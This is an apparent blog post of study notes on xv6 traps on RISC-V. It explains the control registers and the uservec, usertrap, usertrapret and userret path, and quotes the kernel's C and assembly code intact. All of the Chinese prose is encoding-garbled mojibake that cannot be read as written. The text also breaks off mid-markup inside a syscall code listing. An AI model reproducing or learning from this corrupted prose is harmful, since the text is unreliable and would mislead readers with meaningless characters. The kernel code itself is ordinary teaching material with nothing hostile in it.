<h4 id="book-read-2"><a href="#book-read-2" class="headerlink" title="book-read"></a>book-read</h4><h5 id="trap"><a href="#trap" class="headerlink" title="trap"></a>trap</h5><p>æœ‰ä¸‰ç§æ—¶é—´å¯¼è‡´cpuæç½®æ™®é€šæŒ‡ä»¤çš„æ‰§è¡Œï¼Œå¼ºåˆ¶å°†æ§åˆ¶æƒè½¬ç§»ç»™å¤„ç†è¯¥äº‹ä»¶çš„ç‰¹æ®Šä»£ç ä¸Šï¼Œä¸€ç§æƒ…å†µæ˜¯ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨<code>ecall</code>çš„æ—¶å€™ï¼Œä¸€ç§æ˜¯å¼‚å¸¸ï¼Œæ¯”å¦‚user/kernelæŒ‡ä»¤åšäº†ä¸€äº›éæ³•çš„äº‹æƒ…å¦‚é™¤é›¶ï¼Œç¬¬ä¸‰ç§æ˜¯è®¾å¤‡ä¸­æ–­ï¼Œè¿™ä¸‰ç§æƒ…å†µè¢«ç»Ÿç§°ä¸º<code>trap</code>,xv6å†…æ ¸å¤„ç†æ‰€æœ‰çš„trap.</p>
<h5 id="risc-vé™·å…¥æœºåˆ¶"><a href="#risc-vé™·å…¥æœºåˆ¶" class="headerlink" title="risc-vé™·å…¥æœºåˆ¶"></a>risc-vé™·å…¥æœºåˆ¶</h5><p>risc-væ¶æ„çš„cpuéƒ½æœ‰ä¸€ç»„æ§åˆ¶å¯„å­˜å™¨ï¼Œkernelé€šè¿‡å‘è¿™äº›å¯„å­˜å™¨å†™å…¥å†…å®¹æ¥ä½¿cpuå¤„ç†trap</p>
<p>ä¸‹é¢æ˜¯é‡è¦çš„å¯„å­˜å™¨</p>
<blockquote>
<p><code>stvec</code>:å†…æ ¸åœ¨è¿™é‡Œå†™å…¥trapå¤„ç†ç¨‹åºçš„åœ°å€ï¼Œrisc-vè·³è½¬åˆ°è¿™é‡Œå¤„ç†trap</p>
<p><code>sepc</code>:å½“å‘ç”Ÿtrapæ—¶ï¼Œrisc-vä¼šä¿å­˜åŸæ¥<code>pc</code>çš„ä¿¡æ¯åˆ°<code>sepc</code>,<code>sret</code>(ä»é™·é˜±è¿”å›)æŒ‡ä»¤å°±ä¼šå°†<code>sepc</code>å¤åˆ¶åˆ°<code>pc</code>,å†…æ ¸å¯ä»¥å†™å…¥<code>sepc</code>æ¥æ§åˆ¶<code>sret</code>çš„å»å‘ã€‚</p>
<p><code>scause</code>:risc-våœ¨è¿™é‡Œé˜²æ­¢æè¿°trapåŸå› çš„æ•°å­—</p>
<p><code>sscratch</code>:å†…æ ¸åœ¨è¿™é‡Œæ”¾ç½®ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼åœ¨trapå¤„ç†ç¨‹åºä¸€å¼€å§‹å°±ä¼šæ´¾ä¸Šç”¨åœºã€‚</p>
<p><code>sstatus</code>:å…¶ä¸­çš„<code>SIE</code>ä½æ§åˆ¶è®¾å¤‡ä¸­æ–­æ˜¯å¦å¯åŠ¨ï¼Œ<code>SPP</code>ä½æŒ‡ç¤ºtrapæ˜¯æ¥è‡ªuser-modeè¿˜æ˜¯kernel-mode,å¹¶æ§åˆ¶<code>sret</code>è¿”å›çš„æ¨¡å¼</p>
</blockquote>
<p>risc-vç¡¬ä»¶å¯¹æ‰€æœ‰trap(é™¤äº†è®¡æ—¶å™¨ä¸­æ–­)æ‰§è¡Œä»¥ä¸‹æ“ä½œ</p>
<blockquote>
<ol>
<li>å¦‚æœé™·é˜±æ˜¯è®¾å¤‡ä¸­æ–­ï¼Œå¹¶ä¸”çŠ¶æ€<strong>SIE</strong>ä½è¢«æ¸…ç©ºï¼Œåˆ™ä¸æ‰§è¡Œä»¥ä¸‹ä»»ä½•æ“ä½œã€‚</li>
<li>æ¸…é™¤<strong>SIE</strong>ä»¥ç¦ç”¨ä¸­æ–­ã€‚</li>
<li>å°†<code>pc</code>å¤åˆ¶åˆ°<code>sepc</code>ã€‚</li>
<li>å°†å½“å‰æ¨¡å¼ï¼ˆç”¨æˆ·æˆ–ç®¡ç†ï¼‰ä¿å­˜åœ¨çŠ¶æ€çš„<strong>SPP</strong>ä½ä¸­ã€‚</li>
<li>è®¾ç½®<code>scause</code>ä»¥åæ˜ äº§ç”Ÿé™·é˜±çš„åŸå› ã€‚</li>
<li>å°†æ¨¡å¼è®¾ç½®ä¸ºç®¡ç†æ¨¡å¼ã€‚</li>
<li>å°†<code>stvec</code>å¤åˆ¶åˆ°<code>pc</code>ã€‚</li>
<li>åœ¨æ–°çš„<code>pc</code>ä¸Šå¼€å§‹æ‰§è¡Œã€‚</li>
</ol>
</blockquote>
<p>å¯è§cpuç¡¬ä»¶åªä¼šæ‰§è¡Œè¿™äº›æ“ä½œï¼Œå½“æ§åˆ¶æƒç»™åˆ°å†…æ ¸çš„æ—¶å€™ï¼Œå¾—è¦å†…æ ¸è‡ªå·±å®Œæˆå¯¹å†…æ ¸é¡µè¡¨çš„åˆ‡æ¢ï¼Œå¯¹å†…æ ¸æ ˆçš„åˆ‡æ¢ï¼Œç„¶åè¿›å…¥å¯¹trapçœŸæ­£å¤„ç†çš„å‡½æ•°ä¸Šï¼Œå¯¹é™¤äº†<code>pc</code>ä»¥å¤–æ‰€æœ‰å¯„å­˜å™¨çš„ä¿å­˜ã€‚</p>
<h5 id="ä»ç”¨æˆ·ç©ºé—´é™·å…¥"><a href="#ä»ç”¨æˆ·ç©ºé—´é™·å…¥" class="headerlink" title="ä»ç”¨æˆ·ç©ºé—´é™·å…¥"></a>ä»ç”¨æˆ·ç©ºé—´é™·å…¥</h5><p><img src="http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/images/c2/p2.png" alt="img"></p>
<p>æ€»ä½“åˆ†ä¸ºå››æ­¥è°ƒç”¨ï¼Œ<code>uservec</code>,<code>usertrap</code>,<code>usertrapret</code>å’Œ<code>userret</code>ã€‚</p>
<p><strong>uservec</strong></p>
<p><code>uservec</code>ä»£ç å¤„äº<code>kernel/trampoline.S</code>ä¸­ï¼Œä¸€çŒœå°±æ˜¯ç”¨æ±‡ç¼–å†™çš„ï¼Œå› ä¸ºæ§åˆ¶å•ä½åˆ°äº†å¯„å­˜å™¨é‡çº§ï¼Œä½†æ˜¯æ˜¯risc-væï¼Œçœ‹ä¸å¤ªæ‡‚ã€‚å¦‚ä¸Šé¢æ‰€è¯´ï¼Œkernel-modeå¾—å®Œæˆé‚£äº›æ“ä½œæ‰å¯ä»¥è¿›å…¥å¯¹trapçœŸæ­£å¤„ç†çš„å‡½æ•°ä¸Šï¼ˆ<code>usertrap</code>ï¼‰ï¼Œè€Œè¿™äº›æ“ä½œéƒ½è¢«æ”¾ç½®åœ¨<code>uservec</code>ä¸­ï¼Œå³åˆšå¼€å§‹çš„<code>stvec</code>æŒ‡å‘äº†<code>uservec</code>,ä½†æ˜¯åˆšè¿›å…¥kernel-modeçš„æ—¶å€™<code>satp</code>å¹¶æ²¡æœ‰æŒ‡å‘<code>kernel-page</code>,è€Œæ˜¯åœ¨<code>user-page</code>ä¸­ï¼Œè¦æƒ³æ‰§è¡Œ<code>uservec</code>åˆ™å¿…é¡»åœ¨ç”¨æˆ·é¡µè¡¨ä¸­ä¹Ÿæ˜ å°„ä¸Š,åœ¨<code>uservec</code>ä¸­ä¼šåˆ‡æ¢<code>satp</code>ä»¥æŒ‡å‘å†…æ ¸é¡µè¡¨ï¼Œæ‰€ä»¥ä¸ºäº†åœ¨åˆ‡æ¢åç»§ç»­æ‰§è¡ŒæŒ‡ä»¤ï¼Œ<code>uservec</code>å¿…é¡»åœ¨å†…æ ¸é¡µè¡¨å’Œç”¨æˆ·é¡µè¡¨ä¸­æ˜ å°„ç›¸åŒçš„åœ°å€ã€‚</p>
<p>ä¸ºæ­¤xv6ä¸“é—¨è®¾ç½®äº†ä¸€ä¸ªé¡µé¢æ”¾ç½®<code>uservec</code>ä»£ç ï¼Œç„¶åæŠŠè¿™ä¸ªé¡µé¢æ˜ å°„åˆ°å†…æ ¸é¡µè¡¨å’Œæ‰€æœ‰çš„ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œä¸”è™šæ‹Ÿåœ°å€å…¨éƒ¨ç›¸åŒï¼Œè¿™ä¸ªè™šæ‹Ÿåœ°å€å°±æ˜¯ä¸Šå›¾çš„<code>trampoline</code>,åœ¨user-modeæ—¶stvecå°±æŒ‡å‘äº†<code>trampoline</code>å³<code>userevc</code>ã€‚</p>
<p>åˆ°è¿™é‡Œæˆ‘è§‰å¾—ååˆ†åˆç†ï¼Œå¯èƒ½x86ä¹Ÿæ˜¯è¿™æ ·å¹²çš„ï¼Œå½“<code>userevc</code>å¯åŠ¨çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„32ä¸ªå¯„å­˜å™¨éƒ½ä¿å­˜ç€åŸæ¥ä¸­æ–­ä»£ç çš„å€¼ï¼Œä¸èƒ½å¤Ÿéšæ„æ›´æ”¹ï¼Œä½†<code>userevc</code>éœ€è¦èƒ½å¤Ÿä½¿ç”¨ä¸€äº›å¯„å­˜å™¨æ‰èƒ½å®Œæˆä»–çš„åŠŸèƒ½ï¼Œrisc-vçš„<code>sscratch</code>å°±å‘æŒ¥äº†ä½œç”¨ï¼Œ<code>userevc</code>å¼€å§‹çš„æ—¶å€™é€šè¿‡æŒ‡ä»¤<code>csrrw</code>äº¤æ¢äº†<code>a0</code>å’Œ<code>sscratch</code>çš„å†…å®¹ï¼Œæ­¤æ—¶<code>a0</code>å¯„å­˜å™¨çš„å€¼å°±è¢«ä¿å­˜äº†ï¼Œ<code>uservec</code>å°±å¯ä»¥ä½¿ç”¨<code>a0</code>å¯„å­˜å™¨äº†ã€‚</p>
<p>å…·ä½“è¯¥æ€ä¹ˆä¿å­˜æ‰€æœ‰çš„å¯„å­˜å™¨çš„å€¼ï¼Œå°±ç‰µæ‰¯åˆ°äº†å¦ä¸€ä¸ªæœºåˆ¶<code>é™·é˜±å¸§</code>ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé™·é˜±å¸§å°±æ˜¯<code>trapframe</code>,è¯¥å¸§æœ‰ä¿å­˜ç”¨æˆ·æ‰€æœ‰çš„å¯„å­˜å™¨çš„ç©ºé—´ã€‚æ­¤æ—¶<code>satp</code>è¿˜æ˜¯æŒ‡å‘äº†ç”¨æˆ·é¡µè¡¨ï¼Œæ‰€ä»¥è¦ä½¿ç”¨è¿™ä¸ªé™·é˜±å¸§è¿˜å¾—æŠŠä»–æ˜ å°„åˆ°ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œ<code>sscratch</code>å°±æŒ‡å‘äº†è¿™ä¸ªé™·é˜±å¸§ï¼Œæ‰§è¡Œå®Œ<code>csrrw</code>å<code>a0</code>å¯„å­˜å™¨å°±æŒ‡å‘äº†é™·é˜±å¸§ï¼Œç„¶å<code>uservec</code>å°±åˆ©ç”¨a0æŠŠæ‰€æœ‰ç”¨æˆ·å¯„å­˜å™¨ä¿å­˜åœ¨é™·é˜±å¸§ï¼Œé™·é˜±å¸§ä¸­è¿˜åŒ…å«äº†æŒ‡å‘å½“å‰è¿›ç¨‹å†…æ ¸æ ˆçš„æŒ‡é’ˆï¼Œå½“å‰cpuçš„<code>hartid</code>,<code>usertrap</code>çš„åœ°å€ä»¥åŠå†…æ ¸é¡µè¡¨çš„åœ°å€ï¼Œ<code>uservec</code>å°±å–å¾—è¿™äº›å€¼ï¼Œå°†<code>satp</code>åˆ‡æ¢åˆ°å†…æ ¸é¡µè¡¨ï¼Œå¹¶è°ƒç”¨<code>usertrap</code>ã€‚</p>
<p><strong>usertrap</strong></p>
<p>ä¸‹é¢æ˜¯xv6 usertrapä»£ç </p>
<p>ä»£ç æ¯”è¾ƒæ¸…æ™°ï¼Œé¦–å…ˆä¼šæ£€æŸ¥ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Œç„¶åè®¾ç½®<code>stvec</code>,å› ä¸ºæ­¤æ—¶cpuå·²ç»å¤„äºå†…æ ¸æ€äº†ï¼Œå½“å‘ç”Ÿtrapæ—¶å¾—æ‰§è¡Œå†…æ ¸çš„<code>kernelvec</code>è€Œä¸æ˜¯<code>suervec</code>,æ‰€ä»¥ä¼šæŠŠ<code>stvec</code>æŒ‡å‘<code>kernelvec</code>,ç„¶åä¿å­˜äº†sepcåˆ°p-&gt;trapframe-&gt;sepcä¸­é˜²æ­¢è¢«è¦†ç›–ï¼Œç„¶ååˆ¤æ–­trapçš„ç±»å‹ï¼Œå¦‚æœæ˜¯ç³»ç»Ÿè°ƒç”¨<code>syscall()</code>ä¼šå¤„ç†ï¼Œå¦‚æœæ˜¯è®¾å¤‡ä¸­æ–­ï¼Œ<code>devintr</code>ä¼šå¤„ç†ä»–ï¼Œå¦åˆ™å°±æ˜¯ä¸€ä¸ªå¼‚å¸¸ï¼Œå°±è®¾ç½®<code>p-&gt;killed=1</code>,ä»£è¡¨ä¼šè¢«æ€æ­»ï¼Œæœ€åå†…æ ¸æ£€æŸ¥è¿›ç¨‹æ˜¯å¦åº”è¯¥è¢«æ€æ­»æˆ–è€…å› ä¸ºæ—¶é’Ÿä¸­æ–­è®©å‡ºcpu,æœ€åè°ƒç”¨<code>usertrapret</code>,æµç¨‹æ¯”èµ·<code>uservec</code>å¥½ç†è§£å¤šäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>usertrapret</strong></p>
<p>é¦–å…ˆæ˜¯è·å¾—è¿›ç¨‹çš„procç»“æ„ä½“ï¼Œç„¶åæ˜¯<code>intr_off</code>è®¾ç½®äº†sstatusçš„<code>sie</code>ä½ï¼Œç„¶åæ˜¯è®¾ç½®äº†<code>stvec</code>ï¼Œå› ä¸ºè¦è¿”å›ç”¨æˆ·æ€äº†ï¼Œæ‰€ä»¥trapå¤„ç†ç¨‹åºå˜æˆäº†<code>uservec</code>,ç„¶åæ˜¯åœ¨é™·é˜±å¸§ä¸­è®°å½•å†…æ ¸é¡µè¡¨åœ°å€ï¼Œspåœ°å€ï¼Œ<code>usertrap</code>åœ°å€ï¼Œä»¥åŠ<code>hartid</code>ã€‚ç„¶åæ˜¯è®¾ç½®sstatusçš„sspä½ï¼ŒæŠŠä¸Šä¸€ä¸ªæ¨¡å¼è®¾ç½®ä¸ºuser-mode,ç„¶åæ˜¯è®¾ç½®sepcå¾—åˆ°ç”¨æˆ·æ€é¡µè¡¨åœ°å€ï¼Œç„¶ååˆè·³å›<code>trampoline</code>ä¸­æ‰§è¡Œ<code>userret</code>,è‡³äºä¸ºä»€ä¹ˆè¦æŠŠ<code>userret</code>å‡½æ•°æ”¾ç½®åœ¨<code>trampoline</code>ä¸­ï¼Œæ˜¯å› ä¸º<code>userret</code>ä¸­ä¼šåˆ‡æ¢é¡µè¡¨ã€‚è¦æƒ³åˆ‡æ¢å®Œé¡µè¡¨è¿˜èƒ½ç»§ç»­æ‰§è¡Œ<code>userret</code>åªèƒ½æŠŠä»–æ”¾åœ¨<code>trampoline</code>ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrapret</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we&#x27;re about to switch the destination of traps from</span></span><br><span class="line">  <span class="comment">// kerneltrap() to usertrap(), so turn off interrupts until</span></span><br><span class="line">  <span class="comment">// we&#x27;re back in user space, where usertrap() is correct.</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send syscalls, interrupts, and exceptions to trampoline.S</span></span><br><span class="line">  w_stvec(TRAMPOLINE + (uservec - trampoline));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up trapframe values that uservec will need when</span></span><br><span class="line">  <span class="comment">// the process next re-enters the kernel.</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set S Previous Privilege mode to User.</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tell trampoline.S the user page table to switch to.</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// jump to trampoline.S at the top of memory, which </span></span><br><span class="line">  <span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line">  <span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">  uint64 fn = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(uint64,uint64))fn)(TRAPFRAME, satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>userret</strong></p>
<p>a1ä¿å­˜çš„æ˜¯ç”¨æˆ·æ€é¡µè¡¨åœ°å€ï¼Œa0ä¿å­˜çš„æ˜¯<code>trampoline</code>åœ°å€ï¼Œé¦–å…ˆåˆ‡æ¢é¡µè¡¨ï¼Œç„¶åä»é™·é˜±å¸§ä¸­æ¢å¤ç”¨æˆ·å¯„å­˜å™¨ï¼Œæœ€åè°ƒç”¨<code>sret</code>å®Œæˆå¯¹ç”¨æˆ·æ€çš„åˆ‡æ¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">.globl userret</span><br><span class="line">userret:</span><br><span class="line">        # userret(TRAPFRAME, pagetable)</span><br><span class="line">        # switch from kernel to user.</span><br><span class="line">        # usertrapret() calls here.</span><br><span class="line">        # a0: TRAPFRAME, in user page table.</span><br><span class="line">        # a1: user page table, for satp.</span><br><span class="line"></span><br><span class="line">        # switch to the user page table.</span><br><span class="line">        csrw satp, a1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # put the saved user a0 in sscratch, so we</span><br><span class="line">        # can swap it with our a0 (TRAPFRAME) in the last step.</span><br><span class="line">        ld t0, 112(a0)</span><br><span class="line">        csrw sscratch, t0</span><br><span class="line"></span><br><span class="line">        # restore all but a0 from TRAPFRAME</span><br><span class="line">        ld ra, 40(a0)</span><br><span class="line">        ld sp, 48(a0)</span><br><span class="line">        ld gp, 56(a0)</span><br><span class="line">        ld tp, 64(a0)</span><br><span class="line">        ld t0, 72(a0)</span><br><span class="line">        ld t1, 80(a0)</span><br><span class="line">        ld t2, 88(a0)</span><br><span class="line">        ld s0, 96(a0)</span><br><span class="line">        ld s1, 104(a0)</span><br><span class="line">        ld a1, 120(a0)</span><br><span class="line">        ld a2, 128(a0)</span><br><span class="line">        ld a3, 136(a0)</span><br><span class="line">        ld a4, 144(a0)</span><br><span class="line">        ld a5, 152(a0)</span><br><span class="line">        ld a6, 160(a0)</span><br><span class="line">        ld a7, 168(a0)</span><br><span class="line">        ld s2, 176(a0)</span><br><span class="line">        ld s3, 184(a0)</span><br><span class="line">        ld s4, 192(a0)</span><br><span class="line">        ld s5, 200(a0)</span><br><span class="line">        ld s6, 208(a0)</span><br><span class="line">        ld s7, 216(a0)</span><br><span class="line">        ld s8, 224(a0)</span><br><span class="line">        ld s9, 232(a0)</span><br><span class="line">        ld s10, 240(a0)</span><br><span class="line">        ld s11, 248(a0)</span><br><span class="line">        ld t3, 256(a0)</span><br><span class="line">        ld t4, 264(a0)</span><br><span class="line">        ld t5, 272(a0)</span><br><span class="line">        ld t6, 280(a0)</span><br><span class="line"></span><br><span class="line">	# restore user a0, and save TRAPFRAME in sscratch</span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line">        </span><br><span class="line">        # return to user mode and user pc.</span><br><span class="line">        # usertrapret() set up sstatus and sepc.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p>å€ŸåŠ©ä»ç”¨æˆ·æ€çš„é™·å…¥ç»ˆäºç†æ¸…äº†xv6çš„ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„è½¬æ¢äº†ï¼Œå—ç›ŠåŒªæµ…ã€‚</p>
<p><strong>è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</strong></p>
<p><code>syscall</code>ä»£ç å¦‚ä¸‹ï¼Œä»£ç ç®€ç•¥æ¸…æ™°ï¼Œå°±ä»¥<code>exec</code>è°ƒç”¨ä½ä¾‹å­ï¼Œä¸¤ä¸ªå‚æ•°åˆ†åˆ«å­˜æ”¾åœ¨a0,å’Œa1ä¸­ï¼Œç„¶åæŠŠç³»ç»Ÿè°ƒç”¨å·æ”¾åœ¨a7ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨å·å°±æ˜¯<code>syscall[]</code>çš„ä¸‹æ ‡ï¼Œå¯»æ‰¾åˆ°çš„å€¼å°±æ˜¯è¯¥ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å‡½æ•°ï¼Œ<code>exec</code>ç³»ç»Ÿè°ƒç”¨æœ€åå°±ä¼šè°ƒç”¨<code>sys_exec</code>ã€‚æ­¤æ—¶ä¼šæœ‰ä¸ªç–‘é—®ï¼Œç³»ç»Ÿè°ƒç”¨éƒ½æ˜¯æœ‰å‚æ•°çš„ï¼Œä¸ºä»€ä¹ˆæœ€åçš„<code>p-&gt;trapframe-&gt;a0 = syscalls[num]();</code>æ²¡æœ‰å‘¢ï¼Œæˆ‘å¤§æ¦‚çœ‹äº†<code>sys_exec</code>çš„ä»£ç ï¼Œå‘ç°ä»–æ˜¯ç›´æ¥ä»é™·é˜±å¸§ä¸­å–å¯„å­˜å™¨å€¼çš„ï¼Œè€Œä¸æ˜¯ä¼ å‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 